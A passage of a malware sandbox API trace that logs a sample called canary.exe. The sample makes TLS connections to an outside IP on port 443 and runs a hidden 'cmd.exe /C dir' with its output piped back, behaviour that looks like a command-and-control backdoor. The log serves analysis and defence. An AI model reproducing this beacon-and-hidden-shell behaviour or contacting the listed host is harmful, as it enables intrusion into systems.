+[STR]                   -> "HTTP/1.1 200 OK\r\nDate: Fri, 07 Mar 2025 16:41:50 GMT\r\nServer: Apache/2.4.41 (Ubuntu)\r\nContent-Length: 40\r\nConten"
+[STR]                      "t-Type: text/html; charset=UTF-8\r\n\r\n3XLuSjRx6Y17ZlS329KMj8TLT011LuYhr18VgAhO"
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x24
+[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
+[FLD]                   -> pvBuffer   = 0x000000264195BF51
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[RES] SECURITY_STATUS 0x0 (SEC_E_OK)
+
+[CNT] [120]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <setsockopt> in [WS2_32.dll] 
+[PAR] SOCKET s       : 0x3d0
+[PAR] int    level   : 0xffff (SOL_SOCKET)
+[PAR] int    optname : 0x1006 (SO_RCVTIMEO)
+[PAR] char   *optval : 0x000000263FD2E6A8
+[PAR] int    optlen  : 0x4
+[RET] 0x7ffa2bc03721 in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[EVT] [Max Sleep]
+[MSG] Delay Execution reduced from 30000 ms to 15000 ms 
+
+[CNT] [121]
+[PTP] [0x784] [0x918] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CreatePipe> in [KERNEL32.dll] 
+[PAR] PHANDLE               hReadPipe        : 0x000000265B15E9F0
+[PAR] PHANDLE               hWritePipe       : 0x000000265B15E9F8
+[PAR] LPSECURITY_ATTRIBUTES lpPipeAttributes : 0x000000265B15E9C0
+[PAR] DWORD                 nSize            : 0x0
+[RET] 0x7ffa2c05bd5f in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x918] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <CreatePipe>
+[PAR] HANDLE  hReadPipe  : 0x48c
+[PAR] HANDLE  hWritePipe : 0x668
+[RES] BOOL 0x1
+
+[CNT] [122]
+[PTP] [0x784] [0x918] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <DuplicateHandle> in [KERNEL32.dll] 
+[PAR] HANDLE   hSourceProcessHandle : 0xFFFFFFFFFFFFFFFF
+[PAR] HANDLE   hSourceHandle        : 0x48c
+[PAR] HANDLE   hTargetProcessHandle : 0xFFFFFFFFFFFFFFFF
+[PAR] LPHANDLE lpTargetHandle       : 0x000000265B15EA58
+[PAR] DWORD    dwDesiredAccess      : 0x0
+[PAR] BOOL     bInheritHandle       : 0x0
+[PAR] DWORD    dwOptions            : 0x2
+[RET] 0x7ffa2c05e300 in [System.ni.dll]
+
+[CNT] [123]
+[PTP] [0x784] [0x918] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CreatePipe> in [KERNEL32.dll] 
+[PAR] PHANDLE               hReadPipe        : 0x000000265B15E9F0
+[PAR] PHANDLE               hWritePipe       : 0x000000265B15E9F8
+[PAR] LPSECURITY_ATTRIBUTES lpPipeAttributes : 0x000000265B15E9C0
+[PAR] DWORD                 nSize            : 0x0
+[RET] 0x7ffa2c05bd5f in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x918] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <CreatePipe>
+[PAR] HANDLE  hReadPipe  : 0x48c
+[PAR] HANDLE  hWritePipe : 0x670
+[RES] BOOL 0x1
+
+[CNT] [124]
+[PTP] [0x784] [0x918] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <DuplicateHandle> in [KERNEL32.dll] 
+[PAR] HANDLE   hSourceProcessHandle : 0xFFFFFFFFFFFFFFFF
+[PAR] HANDLE   hSourceHandle        : 0x48c
+[PAR] HANDLE   hTargetProcessHandle : 0xFFFFFFFFFFFFFFFF
+[PAR] LPHANDLE lpTargetHandle       : 0x000000265B15EA58
+[PAR] DWORD    dwDesiredAccess      : 0x0
+[PAR] BOOL     bInheritHandle       : 0x0
+[PAR] DWORD    dwOptions            : 0x2
+[RET] 0x7ffa2c05e300 in [System.ni.dll]
+
+[CNT] [125]
+[PTP] [0x784] [0x918] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CreateProcessW> in [KERNEL32.dll] 
+[PAR] LPCWSTR               lpApplicationName   : 0x0 (null)
+[PAR] LPCWSTR               lpCommandLine       : 0x000000265B15E9F0
+[STR]                       -> ""cmd.exe"  /C dir"
+[PAR] LPSECURITY_ATTRIBUTES lpProcessAttributes : 0x0
+[PAR] LPSECURITY_ATTRIBUTES lpThreadAttributes  : 0x0
+[PAR] BOOL                  bInheritHandles     : 0x1
+[PAR] DWORD                 dwCreationFlags     : 0x8000000 (CREATE_NO_WINDOW)
+[PAR] LPVOID                lpEnvironment        : 0x0
+[PAR] LPCWSTR               lpCurrentDirectory   : 0x000000264193FB84
+[STR]                       -> "C:\Users\user\Desktop\quiet_canary"
+[PAR] LPSTARTUPINFOW        lpStartupInfo        : 0x000000265B15E980
+[FLD]                       -> lpDesktop   = 0x0 (null)
+[FLD]                       -> lpTitle     = 0x0 (null)
+[FLD]                       -> dwFlags     = 0x100 (STARTF_USESTDHANDLES)
+[FLD]                       -> wShowWindow = 0x0
+[FLD]                       -> hStdInput   = 0x0
+[FLD]                       -> hStdOutput  = 0x668
+[FLD]                       -> hStdError   = 0x670
+[PAR] LPPROCESS_INFORMATION lpProcessInformation : 0x000000264193F388
+[RET] 0x7ffa2bbfec01 in [System.ni.dll]
+
+Creation de Processus, pid [0x920] (C:\Windows\System32\cmd.exe)
+
+Creation de Processus, pid [0x90c] (C:\Windows\System32\conhost.exe)
+
+Destruction de Processus, pid [0x920] (C:\Windows\System32\cmd.exe)
+
+Destruction de Processus, pid [0x90c] (C:\Windows\System32\conhost.exe)
+
+[CNT] [126]
+[PTP] [0x784] [0x918] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CloseHandle> in [KERNEL32.dll] 
+[PAR] HANDLE hObject    : 0x48c
+[RET] 0x7ffa2bbfc018 in [System.ni.dll]
+
+[CNT] [127]
+[PTP] [0x784] [0x918] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CloseHandle> in [KERNEL32.dll] 
+[PAR] HANDLE hObject    : 0x678
+[RET] 0x7ffa2bbfc018 in [System.ni.dll]
+
+[CNT] [128]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <QueryPerformanceCounter> in [KERNEL32.dll] 
+[RET] 0x7ffa2bbfd3f0 in [System.ni.dll]
+
+[CNT] [129]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x0
+[PAR]  fd_set FAR*  readfds   : 0x000000264195F860
+[FLD]               -> socket_0 = 0x00000000000003D0
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x0
+[PAR]  timeval FAR* timeout   : 0x000000263FD2E598
+[RET] 0x7ffa2bc0386a in [System.ni.dll]
+
+[CNT] [130]
+[PTP] [0x784] [0xbe4] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertFreeCertificateContext> in [CRYPT32.dll] 
+[PAR] PCCERT_CONTEXT pCertContext : 0x000000263FDDF0D0
+[RET] 0x7ffa2bc06cd8 in [System.ni.dll]
+
+[CNT] [131]
+[PTP] [0x784] [0xbe4] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertCloseStore> in [CRYPT32.dll] 
+[PAR] HCERTSTORE hCertStore : 0x000000263FE2AF50
+[PAR] DWORD      dwFlags    : 0x0 
+[RET] 0x7ffa2bc06e7d in [System.ni.dll]
+
+[CNT] [132]
+[PTP] [0x784] [0xbe4] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertFreeCertificateContext> in [CRYPT32.dll] 
+[PAR] PCCERT_CONTEXT pCertContext : 0x000000263FDDF0D0
+[RET] 0x7ffa2bc06cd8 in [System.ni.dll]
+
+[CNT] [133]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <QueryContextAttributesW> in [SSPICLI.DLL] 
+[PAR] PCtxtHandle    phContext     : 0x0000002641938128
+[PAR] unsigned long  ulAttribute   : 0x1a (ISC_RET_MUTUAL_AUTH | ISC_RET_SEQUENCE_DETECT | ISC_RET_CONFIDENTIALITY)
+[PAR] void           *pBuffer      : 0x000000263FD2E4C0
+[RET] 0x7ffa2bc06c20 in [System.ni.dll]
+
+[CNT] [134]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <DeleteSecurityContext> in [SSPICLI.DLL] 
+[PAR] PCtxtHandle phContext : 0x0000002641938128
+[RET] 0x7ffa2bc06820 in [System.ni.dll]
+
+[CNT] [135]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <shutdown> in [WS2_32.dll] 
+[RET] 0x7ffa2bc03f53 in [System.ni.dll]
+
+[CNT] [136]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <setsockopt> in [WS2_32.dll] 
+[PAR] SOCKET s       : 0x3d0
+[PAR] int    level   : 0xffff (SOL_SOCKET)
+[PAR] int    optname : 0x80 (SO_LINGER)
+[PAR] char   *optval : 0x000000263FD2DBC0
+[PAR] int    optlen  : 0x4
+[RET] 0x7ffa2bbfc998 in [System.ni.dll]
+
+[CNT] [137]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <closesocket> in [WS2_32.dll] 
+[PAR] SOCKET       s : 0x3d0
+[RET] 0x7ffa2bbfcbf8 in [System.ni.dll]
+
+[CNT] [138]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WSASocketW> in [WS2_32.dll] 
+[PAR] int                address_family : 0x2 (AF_INET) (IPv4)
+[PAR] int                type           : 0x1 (SOCK_STREAM)
+[PAR] int                protocol       : 0x6 (IPPROTO_TCP)
+[PAR] LPWSAPROTOCOL_INFO lpProtocolInfo : 0x0
+[PAR] GROUP              g              : 0x0
+[PAR] DWORD              dwFlags        : 0x1
+[RET] 0x7ffa2bbfc89b in [System.ni.dll]
+
+[CNT] [139]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WSASocketW> in [WS2_32.dll] 
+[PAR] int                address_family : 0x17 (AF_INET6) (IPv6)
+[PAR] int                type           : 0x1 (SOCK_STREAM)
+[PAR] int                protocol       : 0x6 (IPPROTO_TCP)
+[PAR] LPWSAPROTOCOL_INFO lpProtocolInfo : 0x0
+[PAR] GROUP              g              : 0x0
+[PAR] DWORD              dwFlags        : 0x1
+[RET] 0x7ffa2bbfc89b in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[EVT] [Dynamic Network analysis]
+[MSG] Spoofing IP 210.48.231.182 with IP 169.254.143.43
+
+[CNT] [140]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WSAConnect> in [WS2_32.dll] 
+[PAR] SOCKET   s     : 0x3d0
+[PAR] sockaddr *name : 0x00000026419679C0
+[FLD]          -> sin_family   : 2 (IPv4)
+[FLD]          -> sin_port     : 47873 (Little endian : 443)
+[FLD]          -> sin_addr     : 210.48.231.182
+[RET] 0x7ffa2bc03542 in [System.ni.dll]
+
+[CNT] [141]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <closesocket> in [WS2_32.dll] 
+[PAR] SOCKET       s : 0x25c
+[RET] 0x7ffa2bbfcbf8 in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[EVT] [Dynamic Network analysis]
+[MSG] Spoofing IP 210.48.231.182 with IP 169.254.143.43
+
+[CNT] [142]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <InitializeSecurityContextW> in [SSPICLI.DLL] 
+[PAR] PCredHandle    phCredential  : 0x000000263FD2DB48
+[PAR] PCtxtHandle    phContext     : 0x0
+[PAR] WCHAR*         pszTargetName : 0x000000264195E74C
+[STR]                -> "210.48.231.182"
+[PAR] unsigned long  fContextReq   : 0x8011c (ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_MANUAL_CRED_VALIDATION)
+[PAR] unsigned long  Reserved1     : 0x0
+[PAR] unsigned long  TargetDataRep : 0x10 (SECURITY_NATIVE_DREP)
+[PAR] PSecBufferDesc pInput        : 0x0
+[PAR] unsigned long  Reserved2     : 0x0
+[PAR] PCtxtHandle    phNewContext  : 0x0000002641968E08
+[PAR] PSecBufferDesc pOutput       : 0x0000002641968D60
+[PAR] unsigned long* pfContextAttr : 0x0000002641968C28
+[PAR] PTimeStamp     ptsExpiry     : 0x000000263FD2DB40
+[RET] 0x7ffa2bc06b36 in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <InitializeSecurityContextW>
+[PAR] PSecBufferDesc pOutput       : 0x0000000100000000
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x1
+[FLD]                -> pBuffers  = 0x0000002641968DB0
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x123
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x000000265AF64F60
+[PAR] unsigned long  pfContextAttr : 0x8811c (ISC_RET_REPLAY_DETECT | ISC_RET_SEQUENCE_DETECT | ISC_RET_CONFIDENTIALITY | ISC_RET_ALLOCATED_MEMORY | ISC_RET_STREAM | ISC_RET_MANUAL_CRED_VALIDATION)
+[RES] SECURITY_STATUS 0x90312 (SEC_I_CONTINUE_NEEDED)
+
+[CNT] [143]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <send> in [WS2_32.dll] 
+[PAR] SOCKET s    : 0x3d0
+[PAR] char   *buf : 0x0000002641968E30
+[PAR] int    len  : 0x123
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [144]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x0000002641968E30
+[PAR] int    len    : 0x5
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [145]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x0000002641968E35
+[PAR] int    len    : 0x31
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [146]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <InitializeSecurityContextW> in [SSPICLI.DLL] 
+[PAR] PCredHandle    phCredential  : 0x000000263FD2DA18
+[PAR] PCtxtHandle    phContext     : 0x000000263FD2DAD0
+[PAR] WCHAR*         pszTargetName : 0x000000264195E74C
+[STR]                -> "169.254.143.43"
+[PAR] unsigned long  fContextReq   : 0x8011c (ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_MANUAL_CRED_VALIDATION)
+[PAR] unsigned long  Reserved1     : 0x0
+[PAR] unsigned long  TargetDataRep : 0x10 (SECURITY_NATIVE_DREP)
+[PAR] PSecBufferDesc pInput        : 0x0000002641969048
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x2
+[FLD]                -> pBuffers  = 0x0000002641969090
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x36
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x0000002641968E30
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] unsigned long  Reserved2     : 0x0
+[PAR] PCtxtHandle    phNewContext  : 0x0000002641968E08
+[PAR] PSecBufferDesc pOutput       : 0x0000002641969068
+[PAR] unsigned long* pfContextAttr : 0x0000002641968C28
+[PAR] PTimeStamp     ptsExpiry     : 0x000000263FD2DA10
+[RET] 0x7ffa2bc06b36 in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <InitializeSecurityContextW>
+[PAR] PSecBufferDesc pOutput       : 0x0000000100000000
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x1
+[FLD]                -> pBuffers  = 0x00000026419690F0
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] unsigned long  pfContextAttr : 0x8811c (ISC_RET_REPLAY_DETECT | ISC_RET_SEQUENCE_DETECT | ISC_RET_CONFIDENTIALITY | ISC_RET_ALLOCATED_MEMORY | ISC_RET_STREAM | ISC_RET_MANUAL_CRED_VALIDATION)
+[RES] SECURITY_STATUS 0x90312 (SEC_I_CONTINUE_NEEDED)
+
+[CNT] [147]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x0000002641969158
+[PAR] int    len    : 0x5
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [148]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x000000264196917D
+[PAR] int    len    : 0x1
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [149]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <InitializeSecurityContextW> in [SSPICLI.DLL] 
+[PAR] PCredHandle    phCredential  : 0x000000263FD2D8E8
+[PAR] PCtxtHandle    phContext     : 0x000000263FD2D9A0
+[PAR] WCHAR*         pszTargetName : 0x000000264195E74C
+[STR]                -> "169.254.143.43"
+[PAR] unsigned long  fContextReq   : 0x8011c (ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_MANUAL_CRED_VALIDATION)
+[PAR] unsigned long  Reserved1     : 0x0
+[PAR] unsigned long  TargetDataRep : 0x10 (SECURITY_NATIVE_DREP)
+[PAR] PSecBufferDesc pInput        : 0x0000002641969250
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x2
+[FLD]                -> pBuffers  = 0x0000002641969298
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x6
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x0000002641969178
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] unsigned long  Reserved2     : 0x0
+[PAR] PCtxtHandle    phNewContext  : 0x0000002641968E08
+[PAR] PSecBufferDesc pOutput       : 0x0000002641969270
+[PAR] unsigned long* pfContextAttr : 0x0000002641968C28
+[PAR] PTimeStamp     ptsExpiry     : 0x000000263FD2D8E0
+[RET] 0x7ffa2bc06b36 in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <InitializeSecurityContextW>
+[PAR] PSecBufferDesc pOutput       : 0x0000000100000000
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x1
+[FLD]                -> pBuffers  = 0x00000026419692F8
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] unsigned long  pfContextAttr : 0x8811c (ISC_RET_REPLAY_DETECT | ISC_RET_SEQUENCE_DETECT | ISC_RET_CONFIDENTIALITY | ISC_RET_ALLOCATED_MEMORY | ISC_RET_STREAM | ISC_RET_MANUAL_CRED_VALIDATION)
+[RES] SECURITY_STATUS 0x90312 (SEC_I_CONTINUE_NEEDED)
+
+[CNT] [150]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x0000002641969360
+[PAR] int    len    : 0x5
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [151]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x0000002641969385
+[PAR] int    len    : 0x30
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [152]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <InitializeSecurityContextW> in [SSPICLI.DLL] 
+[PAR] PCredHandle    phCredential  : 0x000000263FD2D7B8
+[PAR] PCtxtHandle    phContext     : 0x000000263FD2D870
+[PAR] WCHAR*         pszTargetName : 0x000000264195E74C
+[STR]                -> "169.254.143.43"
+[PAR] unsigned long  fContextReq   : 0x8011c (ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_MANUAL_CRED_VALIDATION)
+[PAR] unsigned long  Reserved1     : 0x0
+[PAR] unsigned long  TargetDataRep : 0x10 (SECURITY_NATIVE_DREP)
+[PAR] PSecBufferDesc pInput        : 0x0000002641969488
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x2
+[FLD]                -> pBuffers  = 0x00000026419694D0
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x35
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x0000002641969380
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] unsigned long  Reserved2     : 0x0
+[PAR] PCtxtHandle    phNewContext  : 0x0000002641968E08
+[PAR] PSecBufferDesc pOutput       : 0x00000026419694A8
+[PAR] unsigned long* pfContextAttr : 0x0000002641968C28
+[PAR] PTimeStamp     ptsExpiry     : 0x000000263FD2D7B0
+[RET] 0x7ffa2bc06b36 in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <InitializeSecurityContextW>
+[PAR] PSecBufferDesc pOutput       : 0x0000000100000000
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x1
+[FLD]                -> pBuffers  = 0x0000002641969530
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x3b
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x000000263FE751C0
+[PAR] unsigned long  pfContextAttr : 0x8811c (ISC_RET_REPLAY_DETECT | ISC_RET_SEQUENCE_DETECT | ISC_RET_CONFIDENTIALITY | ISC_RET_ALLOCATED_MEMORY | ISC_RET_STREAM | ISC_RET_MANUAL_CRED_VALIDATION)
+[RES] SECURITY_STATUS 0x0 (SEC_E_OK)
+
+[CNT] [153]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <QueryContextAttributesW> in [SSPICLI.DLL] 
+[PAR] PCtxtHandle    phContext     : 0x0000002641968E08
+[PAR] unsigned long  ulAttribute   : 0x4 (ISC_RET_REPLAY_DETECT)
+[PAR] void           *pBuffer      : 0x0000002641969628
+[RET] 0x7ffa2bc06c20 in [System.ni.dll]
+
+[CNT] [154]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <QueryContextAttributesW> in [SSPICLI.DLL] 
+[PAR] PCtxtHandle    phContext     : 0x0000002641968E08
+[PAR] unsigned long  ulAttribute   : 0x5a (ISC_RET_MUTUAL_AUTH | ISC_RET_SEQUENCE_DETECT | ISC_RET_CONFIDENTIALITY | ISC_RET_USED_COLLECTED_CREDS)
+[PAR] void           *pBuffer      : 0x0000002641969680
+[RET] 0x7ffa2bc06c20 in [System.ni.dll]
+
+[CNT] [155]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <QueryContextAttributesW> in [SSPICLI.DLL] 
+[PAR] PCtxtHandle    phContext     : 0x0000002641968E08
+[PAR] unsigned long  ulAttribute   : 0x53 (ISC_RET_DELEGATE | ISC_RET_MUTUAL_AUTH | ISC_RET_CONFIDENTIALITY | ISC_RET_USED_COLLECTED_CREDS)
+[PAR] void           *pBuffer      : 0x00000026419696E8
+[RET] 0x7ffa2bc06c20 in [System.ni.dll]
+
+[CNT] [156]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertDuplicateCertificateContext> in [CRYPT32.dll] 
+[PAR] PCCERT_CONTEXT pCertContext : 0x000000263FE6F4D0
+[FLD]                -> dwCertEncodingType = 0x1 (X509_ASN_ENCODING)
+[FLD]                -> pbCertEncoded      = 0x000000265AF65500
+[FLD]                -> pCertInfo          = 0x000000263FE19250
+[FLD]                -> hCertStore         = 0x000000263FE60A40
+[RET] 0x7ffa2bc06db2 in [System.ni.dll]
+
+[CNT] [157]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertDuplicateStore> in [CRYPT32.dll] 
+[PAR] HCERTSTORE hCertStore : 0x000000263FE60A40
+[RET] 0x7ffa2bc06f62 in [System.ni.dll]
+
+[CNT] [158]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertEnumCertificatesInStore> in [CRYPT32.dll] 
+[PAR] HCERTSTORE     hCertStore       : 0x000000263FE60A40
+[PAR] PCCERT_CONTEXT pPrevCertContext : 0x0
+[RET] 0x7ffa2bc0705d in [System.ni.dll]
+
+[CNT] [159]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertDuplicateCertificateContext> in [CRYPT32.dll] 
+[PAR] PCCERT_CONTEXT pCertContext : 0x000000263FE6F4D0
+[FLD]                -> dwCertEncodingType = 0x1 (X509_ASN_ENCODING)
+[FLD]                -> pbCertEncoded      = 0x000000265AF65500
+[FLD]                -> pCertInfo          = 0x000000263FE19250
+[FLD]                -> hCertStore         = 0x000000263FE60A40
+[RET] 0x7ffa2bc06db2 in [System.ni.dll]
+
+[CNT] [160]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
